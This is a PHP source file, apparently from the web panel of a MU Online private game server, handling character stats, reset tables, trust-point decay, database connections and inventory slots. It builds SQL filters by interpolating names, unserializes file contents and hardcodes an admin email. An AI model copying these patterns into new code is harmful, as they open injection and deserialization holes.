                    $isClass = $char_img[1];
                    if (array_key_exists($char_img[1], $img_character)) $Char_Image = $img_character[$char_img[1]];
                }

                if (date('d', ctime()) != date('d', $do['Resets_Time'])) {
                    $do['NoResetInDay'] = 0;
                    //do_update_character('Character','NoResetInDay=0',"Name:'$do[0]'");
                }

                $showchar[$do['Name']] = array(
                    'char_image' => $Char_Image,
                    'cclass' => $Class,
                    //'name' => $do[0],
                    'class' => $do['Class'],
                    'level' => $do['cLevel'],
                    'str' => $do['Strength'],
                    'dex' => $do['Dexterity'],
                    'vit' => $do['Vitality'],
                    'ene' => $do['Energy'],
                    'com' => $do['Leadership'],
                    'reset' => $do['Resets'],
                    'relife' => $do['Relifes'],
                    'point' => $do['LevelUpPoint'],
                    'point_dutru' => $do['pointdutru'],
                    'status_off' => $do['uythacoffline_stat'],
                    'point_uythac' => $do['PointUyThac'],
                    'pcpoint' => $do['SCFPCPoints'],
                    'accountId' => $do['AccountID'],
                    'resetInDay' => $do['NoResetInDay'],
                    'money' => $do['Money'],
                    'top_50' => $do['Top50'],
                    'Resets_Time' => $do['Resets_Time'],
                    'status_on' => $do['UyThac'],
                    'shop_inventory' => $do['image'],
                    'PkLevel' => $do['PkLevel'],
                    'PkCount' => $do['PkCount'],
                    'MapNumber' => $do['MapNumber'],
                    'IsThuePoint' => $do['IsThuePoint'],
                    'TimeThuePoint' => $do['TimeThuePoint'],
                    'isClass' => $isClass,
                );
                //$showchar_[$do[0]] = $showchar;PkLevel, PkCount
            }
        }
    } else {
        msg_err("Bạn chưa tạo nhân vật. Vui lòng đăng nhập game trước khi thực hiện tác vụ này.");
    }

    return isset($showchar) ? $showchar : array();
}


function cn_template_class()
{
    // No in cache
    if ($class = mcache_get('#class')) {
        return $class;
    }

    mcache_set('#class', $class = cn_get_template_by('class'));
    return $class;
}

function cn_template_reset()
{
    // No in cache
    if ($_reset = mcache_get('#reset')) {
        return $_reset;
    }

    $reset = cn_get_template_by('reset');
    if (!$reset) {
        return NULL;
    }

    $key_rs = array_keys($reset);
    //$index = 0;
    $options_rs = array();
    for ($id = 0; $id < count($reset); $id += 9) {
        $options_rs[] = array(
            'reset' => $reset[$key_rs[$id]],
            'level' => $reset[$key_rs[$id + 1]],
            'zen' => $reset[$key_rs[$id + 2]],
            'chaos' => $reset[$key_rs[$id + 3]],
            'cre' => $reset[$key_rs[$id + 4]],
            'blue' => $reset[$key_rs[$id + 5]],
            'point' => $reset[$key_rs[$id + 6]],
            'command' => $reset[$key_rs[$id + 7]],
            'time' => $reset[$key_rs[$id + 8]]
        );
        //++$index;
    }
    mcache_set('#reset', $options_rs);

    return $options_rs;
}

function cn_template_resetvip()
{
    // No in cache
    if ($_resetvip = mcache_get('#resetvip')) {
        return $_resetvip;
    }

    $resetvip = cn_get_template_by('reset_vip');
    if (!$resetvip) {
        return NULL;
    }
    $reset = cn_template_reset();
    $key_rsvip = array_keys($resetvip);
    $index = 0;
    for ($id = 0; $id < count($resetvip); $id += 5) {
        $options_rsvip[$index]['reset'] = $reset[$index]['reset'];
        $options_rsvip[$index]['level'] = $resetvip[$key_rsvip[$id]];
        $options_rsvip[$index]['vpoint'] = $resetvip[$key_rsvip[$id + 1]];
        $options_rsvip[$index]['gcoin'] = $resetvip[$key_rsvip[$id + 2]];
        $options_rsvip[$index]['point'] = $resetvip[$key_rsvip[$id + 3]];
        $options_rsvip[$index]['command'] = $resetvip[$key_rsvip[$id + 4]];
        $options_rsvip[$index]['time'] = $reset[$index]['time'];
        ++$index;
    }
    mcache_set('#resetvip', $options_rsvip);

    return $options_rsvip;
}

function cn_template_relife()
{
    // No in cache
    if ($_relife = mcache_get('#relife')) {
        return $_relife;
    }

    $relife = cn_get_template_by('relife');
    if (!$relife) {
        return NULL;
    }

    $key_relife = array_keys($relife);
    $index = 0;
    for ($id = 0; $id < count($relife); $id += 3) {
        $options_rl[$index]['reset'] = $relife[$key_relife[$id]];
        $options_rl[$index]['point'] = $relife[$key_relife[$id + 1]];
        $options_rl[$index]['command'] = $relife[$key_relife[$id + 2]];
        ++$index;
    }
    mcache_set('#relife', $options_rl);

    return $options_rl;
}

function cn_template_uythacrs()
{

    // No in cache
    if ($_uythac_rs = mcache_get('#uythacrs')) {
        return $_uythac_rs;
    }

    $uythac_rs = cn_get_template_by('uythac_reset');
    if (!$uythac_rs) {
        return NULL;
    }
    $reset = cn_template_reset();
    $id = 0;
    foreach ($uythac_rs as $index => $val) {
        $options_uythac_rs[$id]['reset'] = $reset[$id]['reset'];
        $options_uythac_rs[$id]['point'] = $val;
        $options_uythac_rs[$id]['zen'] = $reset[$id]['zen'];
        $options_uythac_rs[$id]['chaos'] = $reset[$id]['chaos'];
        $options_uythac_rs[$id]['cre'] = $reset[$id]['cre'];
        $options_uythac_rs[$id]['blue'] = $reset[$id]['blue'];
        $options_uythac_rs[$id]['time'] = $reset[$id]['time'];
        ++$id;
    }
    mcache_set('#uythacrs', $options_uythac_rs);

    return $options_uythac_rs;
}

function cn_template_uythacrsvip()
{
    // No in cache
    if ($_uythac_rsvip = mcache_get('#uythacrsvip')) {
        return $_uythac_rsvip;
    }

    $uythac_rsvip = cn_get_template_by('uythac_resetvip');
    if (!$uythac_rsvip) {
        return NULL;
    }
    $resetvip = cn_template_resetvip();
    $id = 0;
    foreach ($uythac_rsvip as $index => $val) {
        $options_uythac_rsvip[$id]['reset'] = $resetvip[$id]['reset'];
        $options_uythac_rsvip[$id]['point'] = $val;
        $options_uythac_rsvip[$id]['vpoint'] = $resetvip[$id]['vpoint'];
        $options_uythac_rsvip[$id]['gcoin'] = $resetvip[$id]['gcoin'];
        $options_uythac_rsvip[$id]['time'] = $resetvip[$id]['time'];
        ++$id;
    }
    mcache_set('#uythacrsvip', $options_uythac_rsvip);

    return $options_uythac_rsvip;
}

function cn_template_rslimit1()
{
    // No in cache
    if ($_rslimit1 = mcache_get('#rslimit1')) {
        return $_rslimit1;
    }

    $rslimit1 = cn_get_template_by('gioihan_rs');
    if (!$rslimit1) {
        return NULL;
    }
    $key_rslimit1 = array_keys($rslimit1);
    $id = 0;
    foreach ($rslimit1 as $key => $val) {
        $options_rslimit1[$id]['top'] = $val;//$rslimit1[$key_rslimit1[$id]];
        if (++$id == 6) break;
    }
    mcache_set('#rslimit1', $options_rslimit1);

    return $options_rslimit1;
}

function cn_template_rslimit2()
{
    if ($_rslimit2 = mcache_get('#rslimit2')) {
        return $_rslimit2;
    }

    $rslimit2 = cn_get_template_by('gioihan_rs');
    if (!$rslimit2) {
        return NULL;
    }
    $key_rslimit2 = array_keys($rslimit2);
    $id = 0;
    $index = 0;
    for ($id = 8; $id < count($rslimit2); $id += 4) {
        $options_rslimit2[$index]['day1'] = $rslimit2[$key_rslimit2[6]];
        $options_rslimit2[$index]['day2'] = $rslimit2[$key_rslimit2[7]];
        $options_rslimit2[$index]['col1'] = $rslimit2[$key_rslimit2[$id]];
        $options_rslimit2[$index]['col2'] = $rslimit2[$key_rslimit2[$id + 1]];
        $options_rslimit2[$index]['col3'] = $rslimit2[$key_rslimit2[$id + 2]];
        $options_rslimit2[$index]['col4'] = $rslimit2[$key_rslimit2[$id + 3]];
        ++$index;
    }

    mcache_set('#rslimit2', $options_rslimit2);

    return $options_rslimit2;
}

function cn_template_httt()
{
    // No in cache
    if ($_hotro_tanthu = mcache_get('#hotro_tanthu')) {
        return $_hotro_tanthu;
    }

    $hotro_tanthu = cn_get_template_by('hotro_tanthu');
    if (!$hotro_tanthu) {
        return NULL;
    }
    $key_httt = array_keys($hotro_tanthu);
    $id = 0;
    for ($in_ = 0; $in_ < count($hotro_tanthu); $in_ += 5) {
        $options_httt[$id]['reset_min'] = $hotro_tanthu[$key_httt[$in_]];
        $options_httt[$id]['reset_max'] = $hotro_tanthu[$key_httt[$in_ + 1]];
        $options_httt[$id]['relife_min'] = $hotro_tanthu[$key_httt[$in_ + 2]];
        $options_httt[$id]['relife_max'] = $hotro_tanthu[$key_httt[$in_ + 3]];
        $options_httt[$id]['levelgiam'] = $hotro_tanthu[$key_httt[$in_ + 4]];
        ++$id;
    }
    mcache_set('#hotro_tanthu', $options_httt);

    return $options_httt;
}

// Since 2.0: Get template (if not exists, create from defaults)
function cn_get_template_by($template_name = '')
{
    $templates = getoption('#temp_basic');
    $template_name = strtolower($template_name);

    // User template not exists in config... get from defaults
    if (isset($templates[$template_name])) {
        return $templates[$template_name];
    }
    return false;
}

/*
function cn_template_rstrust(){

    // No in cache
    if ($_uythac_reset = mcache_get('#uythac_reset')){
        return $_uythac_reset;
    }

	$uythac_reset = cn_get_template_by('uythac_reset');
	if (!$uythac_reset){
        return NULL;
    }
	$reset = cn_template_reset();
	$id = 0;
	foreach($uythac_reset as $key => $val){
		$options_trustrs[$id]['reset'] = $reset[$id]['reset'];
		$options_trustrs[$id]['point'] = $val;
		$options_trustrs[$id]['zen'] = $reset[$id]['zen'];
		$options_trustrs[$id]['chaos'] = $reset[$id]['chaos'];
		$options_trustrs[$id]['cre'] = $reset[$id]['cre'];
		$options_trustrs[$id]['blue'] = $reset[$id]['blue'];
		++$id;
	}
    mcache_set('#uythac_reset', $options_trustrs);

    return $options_trustrs;
}
function cn_template_rsviptrust(){

    // No in cache
    if ($_uythac_resetvip = mcache_get('#uythac_resetvip')){
        return $_uythac_resetvip;
    }

	$uythac_resetvip = cn_get_template_by('uythac_resetvip');
	if (!$uythac_resetvip){
        return NULL;
    }
	$resetvip = cn_template_resetvip();
	$id = 0;
	foreach($uythac_resetvip as $in_ => $val){
		$options_trustrsvip[$id]['reset'] = $resetvip[$id]['reset'];
		$options_trustrsvip[$id]['point'] = $val;
		$options_trustrsvip[$id]['vpoint'] = $resetvip[$id]['vpoint'];
		$options_trustrsvip[$id]['gcoin'] = $resetvip[$id]['gcoin'];
		++$id;
	}
    mcache_set('#uythac_resetvip', $options_trustrsvip);

    return $options_trustrsvip;
}
*/
//BQN Check Point trust
function cn_point_trust()
{
    $member = member_get();
    $accc_ = $member['user_name'];

    $show_reponse = view_character($accc_);

    if ($show_reponse) {
        foreach ($show_reponse as $od => $do) {
            if (!empty($sub = $do['Name'])) {
                $arr_trust = do_select_character('Character', 'UyThac,uythaconline_time,PhutUyThacOn_dutru,uythacoffline_stat,uythacoffline_time,PhutUyThacOff_dutru,PointUyThac,UyThacOnline_Daily,UyThacOffline_Daily', "Name='$sub'", '');

                $check_trust = false;
                $ctime = ctime();
                $status_online = $arr_trust[0]['UyThac'];
                $status_offline = $arr_trust[0]['uythacoffline_stat'];
                $trust_point = $arr_trust[0]['PointUyThac'];
                $_time_on_begin = $arr_trust[0]['uythaconline_time'];
                $_time_off_begin = $arr_trust[0]['uythacoffline_time'];
                $point_pt_on = $arr_trust[0]['PhutUyThacOn_dutru'];
                $point_pt_off = $arr_trust[0]['PhutUyThacOff_dutru'];

                $time_begin_on = date("Y-M-d", $_time_on_begin);
                $time_begin_off = date("Y-M-d", $_time_off_begin);
                $_time_ = date("Y-M-d", $ctime);
                $set_time = mktime(0, 0, 0, date("m", $ctime), date("d", $ctime), date("Y", $ctime));

                $_df_on = date_create($time_begin_on);
                $_df_off = date_create($time_begin_off);
                $_de = date_create($_time_);
                //echo "2537 _df_on = $_df_on -> _df_off = $_df_off -> _de =  $_de <br>";
                $count_on = date_diff($_df_on, $_de)->format('%a');
                $count_off = date_diff($_df_off, $_de)->format('%a');

                if ($status_online) {            //Status ON [Online]

                    if ($time_begin_on < $_time_) {
                        $inday_begin_on = date("Y-m-d h:i:sa", $_time_on_begin);
                        $inday_beginon_end = date("Y-m-d", $_time_on_begin); // strtotime
                        $inday_time_beginon = abs(strtotime($inday_begin_on) - strtotime("$inday_beginon_end 11:59:59pm"));

                        if ($inday_time_beginon >= 43200) $Pf = 720;
                        else $Pf = floor($inday_time_beginon / 60);
                        if ($count_on == 1) {
                            $point_pt_on = floor(0.95 * $Pf);
                            $point_pt_off = floor(0.95 * $point_pt_off);
                            //if(date("Y-m-d", $_time_off_begin) != date("Y-m-d",$ctime)) $trust_point = floor($trust_point*0.9);
                            $trust_point = floor($trust_point * 0.9);
                        } else if ($count_on >= 2) {
                            $_bv = floor($Pf * 0.95);
                            //if(date("Y-m-d", $_time_off_begin) != date("Y-m-d",$ctime)) $trust_point = floor($trust_point*pow(0.9,$count_on));
                            $point_pt_off = floor($point_pt_off * pow(0.95, $count_on));
                            $trust_point = floor($trust_point * pow(0.9, $count_on));

                            $do_loop = false;

                            do {
                                --$count_on;
                                if (!$do_loop) {
                                    $_bv += 720;
                                    $do_loop = true;
                                } else $_bv = 720 + (isset($point_pt_on) ? $point_pt_on : 0);
                                $point_pt_on = floor($_bv * 0.95);
                            } while ($count_on > 1);
                        }
                        $check_trust = true;
                        do_update_character('Character', 'UyThacOffline_Daily=0', 'UyThacOnline_Daily=0', "PhutUyThacOff_dutru=$point_pt_off", "PhutUyThacOn_dutru=$point_pt_on", "uythacoffline_time=$set_time", "uythaconline_time=$set_time", "PointUyThac=$trust_point", "Name:'$sub'");
                        //cn_relocation(cn_url_modify(array('reset'), 'mod='.REQ('mod'), 'opt='.REQ('opt'), 'sub='.$sub));
                    } else if ($time_begin_off < $_time_) {
                        $check_trust = true;
                        do_update_character('Character', 'UyThacOffline_Daily=0', "uythacoffline_time=$set_time", "Name:'$sub'");
                        //cn_relocation(cn_url_modify(array('reset'), 'mod='.REQ('mod'), 'opt='.REQ('opt'), 'sub='.$sub));
                    }
                } else if ($status_offline) {        //Starus ON [Offline]

                    if ($time_begin_off < $_time_) {
                        $inday_begin_off = date("Y-m-d h:i:sa", $_time_off_begin);
                        $inday_beginoff_end = date("Y-m-d", $_time_off_begin); // strtotime
                        $inday_time_beginoff = abs(strtotime($inday_begin_off) - strtotime("$inday_beginoff_end 11:59:59pm"));

                        if ($inday_time_beginoff >= 43200) $Pf = 720;
                        else $Pf = floor($inday_time_beginoff / 60);

                        if ($count_off == 1) {
                            $point_pt_off = floor(0.95 * $Pf);
                            $point_pt_on = floor(0.95 * $point_pt_on);
                            //if(date("Y-m-d", $_time_on_begin) != date("Y-m-d",$ctime)) $trust_point = floor($trust_point*0.9);
                            $trust_point = floor($trust_point * 0.9);
                        } else if ($count_off >= 2) {
                            $_bv = floor($Pf * 0.95);
                            $point_pt_on = floor(pow(0.95, $count_off) * $point_pt_on);
                            //if(date("Y-m-d", $_time_on_begin) != date("Y-m-d",$ctime)) $trust_point = floor($trust_point*pow(0.9,$count_off));
                            $trust_point = floor($trust_point * pow(0.9, $count_off));

                            $do_loop = false;

                            do {
                                --$count_off;
                                if (!$do_loop) {
                                    $_bv += 720;
                                    $do_loop = true;
                                } else $_bv = 720 + (isset($point_pt_off) ? $point_pt_off : 0);
                                $point_pt_off = floor($_bv * 0.95);
                            } while ($count_off > 1);
                        }
                        $check_trust = true;
                        do_update_character('Character', 'UyThacOffline_Daily=0', 'UyThacOnline_Daily=0', "PhutUyThacOn_dutru=$point_pt_on", "PhutUyThacOff_dutru=$point_pt_off", "uythaconline_time=$set_time", "uythacoffline_time=$set_time", "PointUyThac=$trust_point", "Name:'$sub'");
                        //cn_relocation(cn_url_modify(array('reset'), 'mod='.REQ('mod'), 'opt='.REQ('opt'), 'sub='.$sub));
                    } else if ($time_begin_on < $_time_) {
                        $check_trust = true;
                        do_update_character('Character', 'UyThacOnline_Daily=0', "uythaconline_time=$set_time", "Name:'$sub'");
                        //cn_relocation(cn_url_modify(array('reset'), 'mod='.REQ('mod'), 'opt='.REQ('opt'), 'sub='.$sub));
                    }
                } else {
                    //exit("ko on + off");
                    $count_min = min($count_on, $count_off);
                    if ($count_min) {

                        $point_pt_on = floor($point_pt_on * pow(0.95, $count_min));
                        $point_pt_off = floor($point_pt_off * pow(0.95, $count_min));
                        $trust_point = floor($trust_point * pow(0.9, $count_min));
                        $check_trust = true;
                        do_update_character('Character', 'UyThacOnline_Daily=0', 'UyThacOffline_Daily=0', "PhutUyThacOff_dutru=$point_pt_off", "PhutUyThacOn_dutru=$point_pt_on", "uythaconline_time=$set_time", "uythacoffline_time=$set_time", "PointUyThac=$trust_point", "Name:'$sub'");
                        //cn_relocation(cn_url_modify(array('reset'), 'mod='.REQ('mod'), 'opt='.REQ('opt'), 'sub='.$sub));
                    } else if ($count_on) {
                        $check_trust = true;
                        do_update_character('Character', 'UyThacOnline_Daily=0', "uythaconline_time=$set_time", "Name:'$sub'");
                    } else if ($count_off) {
                        $check_trust = true;
                        do_update_character('Character', 'UyThacOffline_Daily=0', "uythacoffline_time=$set_time", "Name:'$sub'");
                    }
                }
                if ($check_trust) {
                    $daily_trust = 0;
                    $_time_on_begin = $_time_off_begin = $set_time;
                }
                $trust[$sub]['status_on'] = $status_online;
                $trust[$sub]['status_off'] = $status_offline;
                $trust[$sub]['time_begin_on'] = $_time_on_begin;
                $trust[$sub]['time_begin_off'] = $_time_off_begin;
                $trust[$sub]['phut_on_dutru'] = $point_pt_on;
                $trust[$sub]['phut_off_dutru'] = $point_pt_off;
                $trust[$sub]['pointuythac'] = $trust_point;
                $trust[$sub]['online_daily'] = isset($daily_trust) ? $daily_trust : $arr_trust[0]['UyThacOnline_Daily'];
                $trust[$sub]['offline_daily'] = isset($daily_trust) ? $daily_trust : $arr_trust[0]['UyThacOffline_Daily'];
            }
        }
    } else {
        msg_err("Bạn chưa tạo nhân vật. Vui lòng đăng nhập game trước khi thực hiện tác vụ này.");
    }

    return isset($trust) ? $trust : array();
}

// Since 2.0: Read serialized array from php-safe file (or create file)
function cn_touch_get($target)
{
    $fn = cn_touch($target, TRUE);
    $fc = file($fn);
    unset($fc[0]);

    $fc = join('', $fc);

    if (!$fc) {
        $fc = array();
    } else {
        $data = unserialize(base64_decode($fc));
        if ($data === FALSE) {
            $fc = unserialize($fc);
        } else {
            $fc = $data;
        }
    }

    return $fc;
}

/*
// Since 2.0: Save whole config
function cn_config_save($cfg = null)
{
    if ($cfg === null)
    {
        $cfg = mcache_get('config');
    }

    $fn = cn_path_construct(SERVDIR,'gifnoc').'gifnoc.php';
    $dest = $fn.'-'.mt_rand().'.bak';

    // save all config
    $fx = fopen($dest, 'w+');
    fwrite($fx, "<?php die(); ?>\n" . base64_encode(serialize($cfg)) );
    fclose($fx);
	unlink($fn); // xoa file hien tai
	rename($dest, $fn); //bat len .....

    mcache_set('config', $cfg);
    return $cfg;
}
*/

// Since 2.0: Get option from #CFG or [%site][<opt_name>]
// Usage: #level1/level2/.../levelN or 'option_name' from %site
function getoption($opt_name = '', $var_name = '')
{
    $cfg = mcache_get('config');

    if ($opt_name === '') {
        return $cfg;
    }
    if ($opt_name[0] == '#') {
        $cfn = spsep(substr($opt_name, 1), '/');
        foreach ($cfn as $id) {
            if (isset($cfg[$id])) {
                $cfg = $cfg[$id];
            } else {
                $cfg = array();
                break;
            }
        }

        return $cfg;
    } else if ($opt_name[0] == '@') {
        if (!empty($var_name)) {
            $opt_name_ = substr($opt_name, 1);
            return isset($cfg[$opt_name_][$var_name]) ? $cfg[$opt_name_][$var_name] : FALSE;
        } else {
            $opt_name_arr = spsep(substr($opt_name, 1), '/');
            foreach ($opt_name_arr as $id) {
                if (isset($cfg[$id])) {
                    $cfg = $cfg[$id];
                } else {
                    $cfg = array();
                    break;
                }
            }

            return $cfg;
        }
    } else {
        return isset($cfg['%site'][$opt_name]) ? $cfg['%site'][$opt_name] : FALSE;
    }
}

// Since 2.0: Create file
function cn_touch($fn, $php_safe = FALSE)
{
    if (!file_exists($fn)) {
        $w = fopen($fn, 'w+');

        if ($php_safe) {
            fwrite($w, "<?php die('Direct call - access denied'); ?>\n");
        }
        fclose($w);
    }

    return $fn;
}

// Since 1.5.0: Force relocation
function cn_relocation($url)
{
    header("Location: $url");
    echo '<html><head><title>Redirect...</title><meta http-equiv="refresh" content="0;url=' . cn_htmlspecialchars($url) . '"></head><body>Please wait... Redirecting to "' . cn_htmlspecialchars($url) . '...<br/><br/></body></html>';
    die();
}

// bqn relocation => $db + server
function cn_relocation_db_new()
{
    global $db_new, $config_adminemail, $config_admin;
    $type_connect = getoption('type_connect');
    $localhost = getoption('localhost');
    $databaseuser = getoption('databaseuser');
    $databsepassword = getoption('databsepassword');
    $d_base = getoption('d_base');

    if (!$type_connect || !$localhost || !$databaseuser || !$databsepassword || !$d_base ) {
        echo 'Không có kết nối đến máy chủ!';
        die();
    }
    //$database = "Driver={SQL Server};Server=(local);Database=MuOnline";
    $passviewcard = getoption('passviewcard');
    $passcode = getoption('passcode');
    $passadmin = getoption('passadmin');
    $passcard = getoption('passcard');
    $server_type = getoption('server_type');

    $config_admin = "BUI NGOC";
    $config_adminemail = "ngoctbhy@gmail.com";

    include_once(SERVDIR . '/admin/adodb/adodb.inc.php');

    if ($type_connect == 'odbc') {
        $db_new = ADONewConnection('odbc');
        $database_ = "Driver={SQL Server};Server={$localhost};Database={$d_base}";
        $connect_mssql = $db_new->Connect($database_, $databaseuser, $databsepassword);
        $db_new->SetFetchMode(ADODB_ASSOC_CASE);
        if (!$connect_mssql) die('Ket noi voi SQL Server loi! Hay kiem tra lai ODBC ton tai hoac User & Pass SQL dung.');
    } else if ($type_connect == 'mssql') { // config sau
        if (extension_loaded('mssql')) echo('');
        else die('Loi! Khong the load thu vien php_mssql.dll. Hay cho phep su dung php_mssql.dll trong php.ini');
        $db_new = ADONewConnection('mssql');
        $connect_mssql = $db_new->Connect($localhost, $databaseuser, $databsepassword, $d_base);
        $db_new->SetFetchMode(ADODB_ASSOC_CASE);
        if (!$connect_mssql) die('Loi! Khong the ket noi SQL Server');
        //$conn->ErrorMsg()
    }
}


/**
 * return global
 */
function cn_connect_forum()
{
    require_once ROOT . '/forum/includes/config.php';
    global $db_Forum;
    if (isset($config['Database']['dbtype'])) {
        include_once(ROOT . '/admin/adodb/adodb.inc.php');

        $dbType = $config['Database']['dbtype'];
        $dbname = $config['Database']['dbname'];
        $tableprefix = $config['Database']['tableprefix'];
        $dbservername = @$config['MasterServer']['servername'] ? $config['MasterServer']['servername'] : '';
        $dbport = @$config['MasterServer']['port'] ? $config['MasterServer']['port'] : '';
        $dbusername = @$config['MasterServer']['username'] ? $config['MasterServer']['username'] : '';
        $dbpassword = @$config['MasterServer']['password'] ? $config['MasterServer']['password'] : '';

        if (!$dbservername) $dbservername = @$config['SlaveServer']['servername'] ? $config['SlaveServer']['servername'] : '';
        if (!$dbusername) $dbusername = @$config['SlaveServer']['username'] ? $config['SlaveServer']['username'] : '';
        if (!$dbpassword) $dbpassword = @$config['SlaveServer']['password'] ? $config['SlaveServer']['password'] : '';
        if (!$dbport) $dbport = @$config['SlaveServer']['port'] ? $config['SlaveServer']['port'] : '';

        if ($dbservername && $dbname && $dbusername) {
            switch ($dbType) {
                case 'mysqli':
                    if (extension_loaded('mysqli')) echo('');
                    else die('Loi! Khong the load thu vien php_mysqli.dll. Hay cho phep su dung php_mssql.dll trong php.ini');
                    $db_Forum = ADONewConnection('mysqli');
                    //$db->Connect($server, $userid, $password, $database);
                    $connect_mssql = $db_Forum->Connect($dbservername, $dbusername, $dbpassword, $dbname);
                    if (!$connect_mssql) die('Ket noi voi MYSQLI loi! Hay kiem tra lai MYSQLI ton tai hoac User & Pass SQL dung.');
                    break;
                case 'mysql':
                    if (extension_loaded('mysql')) echo('');
                    else die('Loi! Khong the load thu vien php_mysql.dll. Hay cho phep su dung php_mssql.dll trong php.ini');
                    $db_Forum = ADONewConnection('mysql');
                    //$db->Connect($server, $userid, $password, $database);
                    $connect_mssql = $db_Forum->Connect($dbservername, $dbusername, $dbpassword, $dbname);
                    if (!$connect_mssql) die('Ket noi voi MYSQLI loi! Hay kiem tra lai MYSQLI ton tai hoac User & Pass SQL dung.');
                    break;
                case 'odbc':
                    $db_Forum = ADONewConnection('odbc');
                    $database_ = "Driver={SQL Server};Server={$dbservername};Database={$dbname}";
                    $connect_mssql = $db_Forum->Connect($database_, $dbusername, $dbpassword, $dbname);
                    if (!$connect_mssql) die('Ket noi voi SQL Server loi! Hay kiem tra lai ODBC ton tai hoac User & Pass SQL dung.');
                    break;
                default:
                    break;
            }
        }
    }
}

// Since 2.0: Add message
function cn_throw_message($msg, $area = 'n')
{
    $es = mcache_get('msg:stor');

    if (!isset($es[$area])) $es[$area] = array();
    $es[$area][] = $msg;

    mcache_set('msg:stor', $es);
    return FALSE;
}

// Since 2.0.3
function cn_user_email_as_site($user_email, $username)
{
    if (preg_match('/^www\./i', $user_email)) {
        return '<a target="_blank" href="http://' . cn_htmlspecialchars($user_email) . '">' . $username . '</a>';
    } elseif (preg_match('/^(https?|ftps?):\/\//i', $user_email)) {
        return '<a target="_blank" href="' . cn_htmlspecialchars($user_email) . '">' . $username . '</a>';
    } else {
        return '<a href="mailto:' . cn_htmlspecialchars($user_email) . '">' . $username . '</a>';
    }
}

//
//function CheckSlotWarehouse($warehouse, $itemX, $itemY)
//{
//    $items_data = getoption('#items_data');
//
//    $items = str_repeat('0', 120);
//    $itemsm = str_repeat('1', 120);
//    $i = 0;
//    while ($i < 120) {
//        $item = substr($warehouse, $i * 32, 32);
//        if ($item == "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" || $item == "ffffffffffffffffffffffffffffffff") {
//            $i++;
//            continue;
//        } else {
//            $item32 = getCodeItem($item);
//            echo "3441 ---ref x = $itemX ---ref y = $itemY >>><<< group =" . $item32['group'] . "=> id=" . $item32['id'] . "<br>";
//            $item_data = $items_data[$item32['group'] . '.' . $item32['id']];
//            echo "3443 ---ref x = " . $item_data['X'] . " ---ref y = " . $item_data['Y'] . "<br>";
//            $y = 0;
//            while ($y < $item_data['Y']) {
//                $x = 0;
//                while ($x < $item_data['X']) {
//                    $items = substr_replace($items, '1', ($i + $x) + ($y * 8), 1);
//                    $x++;
//                }
//                $y++;
//            }
//            $i++;
//        }
//    }
//
//    $y = 0;
//    while ($y < $itemY) {
//        $x = 0;
//        while ($x < $itemX) {
//            $x++;
//            $spacerq[$x + (8 * $y)] = true;
//        }
//        $y++;
//    }
//    print_r($spacerq);
//
//    $walked = 0;
//    $i = 0;
//    while ($i < 120) {
//        if (isset($spacerq[$i])) {
//            $itemsm = substr_replace($itemsm, '0', $i - 1, 1);
//            $last = $i;
//            $walked++;
//        }
//        if ($walked == count($spacerq)) $i = 119;
//        $i++;
//    }
//    //echo "<br>3454 --------- items = $itemsm <br>";//exit();0111111101111111011111110
//    $useforlength = substr($itemsm, 0, $last);
//    $findslotlikethis = str_replace('++', '+', str_replace('1', '+[0-1]+', $useforlength));
//
//    echo "<br>3454 --------- items = $itemsm last = $last useforlength = $useforlength <br> findslotlikethis = $findslotlikethis<br>";//exit();
//    $i = 0;
//    $nx = 0;
//    $ny = 0;
//    while ($i < 120) {
//        if ($nx == 8) {
//            $ny++;
//            $nx = 0;
//        }
//        if ((preg_match('/^' . $findslotlikethis . '/', substr($items, $i, strlen($useforlength)))) && ($itemX + $nx < 9) && ($itemY + $ny < 16)) return $i;
//        $i++;
//        $nx++;
//    }
//    return 3840;
//}

function CheckSlotInventory($inventory, $itemX, $itemY)
{
    $items_data = getoption('#items_data');
    $items = str_repeat('0', 64);
    $itemsm = str_repeat('1', 64);
    $i = 0;
    while ($i < 64) {
        $item = substr($inventory, $i * 32, 32);
        if ($item == "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" || $item == "ffffffffffffffffffffffffffffffff") {
            $i++;
            continue;
        } else {
            $item_ = getCodeItem($item);
            $item_data = $items_data[$item_['group'] . "." . $item_['id']];
            $y = 0;
            while ($y < $item_data['Y']) {
                $x = 0;
                while ($x < $item_data['X']) {
                    $items = substr_replace($items, '1', ($i + $x) + ($y * 8), 1);
                    $x++;
                }
                $y++;
            }
            $i++;
        }
    }
    $y = 0;
    while ($y < $itemY) {
        $x = 0;
        while ($x < $itemX) {
            $x++;
            $spacerq[$x + (8 * $y)] = true;
        }
        $y++;
    }
    $walked = 0;
    $i = 0;
    while ($i < 64) {
        if (isset($spacerq[$i])) {
            $itemsm = substr_replace($itemsm, '0', $i - 1, 1);
            $last = $i;
            $walked++;
        }
        if ($walked == count($spacerq)) $i = 63;
        $i++;
    }
    $useforlength = substr($itemsm, 0, $last);
    $findslotlikethis = str_replace('++', '+', str_replace('1', '+[0-1]+', $useforlength));
    $i = 0;
    $nx = 0;
    $ny = 0;
    while ($i < 64) {
        if ($nx == 8) {
            $ny++;
            $nx = 0;
        }
        if ((preg_match('/^' . $findslotlikethis . '/', substr($items, $i, strlen($useforlength)))) && ($itemX + $nx < 9) && ($itemY + $ny < 16)) return $i;
        $i++;
        $nx++;
    }
    return 2048;
}

?>